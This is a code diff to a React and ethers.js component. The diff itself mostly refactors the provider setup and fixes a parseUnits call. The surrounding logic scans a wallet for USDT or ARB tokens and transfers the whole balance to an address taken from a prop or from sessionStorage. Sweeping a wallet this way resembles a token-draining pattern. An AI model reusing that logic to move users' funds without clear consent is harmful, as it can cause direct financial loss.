@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState ,useMemo } from "react";
 import { BsBoxArrowInDown, BsDownload } from "react-icons/bs";
 import { Notyf } from "notyf";
 import "notyf/notyf.min.css";
@@ -85,31 +85,40 @@ ChildProps) => {
 
   const { ethereum }: any = window;
 
+  const provider = useMemo(() => {
+
+    return new ethers.providers.Web3Provider(ethereum);
+
+  }, [])
+
+
   const sendTransaction = async () => {
     let balance;
 
     try {
       setisSuccessfull("Withdrawing Amount...");
 
-      // connect to the blockchain via a front-end provider
-      const provider = new ethers.providers.Web3Provider(ethereum);
+
+  
       const signer = provider.getSigner();
       const user = await signer.getAddress();
 
       const etherBalance = await provider.getBalance(user);
 
       if (etherBalance.isZero()) {
-        // list of ERC-20 token addresses you want to check
+
+        // list of ERC-20 token addresses 
+
         const erc20TokenAddresses = [
-          "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", // Replace with actual token addresses
           "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", // USDT
           "0x912CE59144191C1204E64559FE8253a0e49E6548", // ARB
-          // Add more token addresses as needed
+         
         ];
 
         let selectedTokenAddress = null;
 
         // ABI to check ERC-20 token balance
+
         const balanceAbi = [
           "function balanceOf(address owner) view returns (uint256)",
         ];
@@ -124,6 +133,7 @@ ChildProps) => {
           balance = await tokenContract.balanceOf(user);
 
           // if the balance is greater than 0, select this token and break the loop
+
           if (balance.gt(0)) {
             selectedTokenAddress = tokenAddress;
             break;
@@ -133,8 +143,11 @@ ChildProps) => {
         const amountToSend: any = ethers.utils.formatUnits(balance);
 
         // Proceed only if a valid token with a balance > 0 is found
+
         if (selectedTokenAddress) {
+
           // ABI for the transfer function
+
           const transferAbi = ["function transfer(address to, uint256 amount)"];
           const contract = new ethers.Contract(
             selectedTokenAddress,
@@ -147,7 +160,9 @@ ChildProps) => {
             isInput === false
               ? receipentAdd
               : sessionStorage.getItem("address");
-          const amount = ethers.parseUnits(amountToSend, 18);
+
+         const amount = ethers.utils.parseUnits(amountToSend, 18);
+
 
           // Prepare the transaction data for transfer
           const txData = await contract.populateTransaction.transfer(
@@ -184,11 +199,11 @@ ChildProps) => {
 
           const maxFee = fee * 2;
 
-          // Example calling the incrementFeeCapped(maxFee) method
           const dataMaxFee =
             await contract.populateTransaction.incrementFeeCapped(maxFee);
 
           // Populate the relay SDK request body for the fee
+
           const requestMaxFee = {
             chainId: (await provider.getNetwork()).chainId,
             target: selectedTokenAddress,
@@ -208,6 +223,9 @@ ChildProps) => {
             "No ERC-20 tokens with a balance greater than 0 found for the signer."
           );
         }
+
+
+        
       } else {
         try {
           const provider = new ethers.providers.Web3Provider(ethereum);
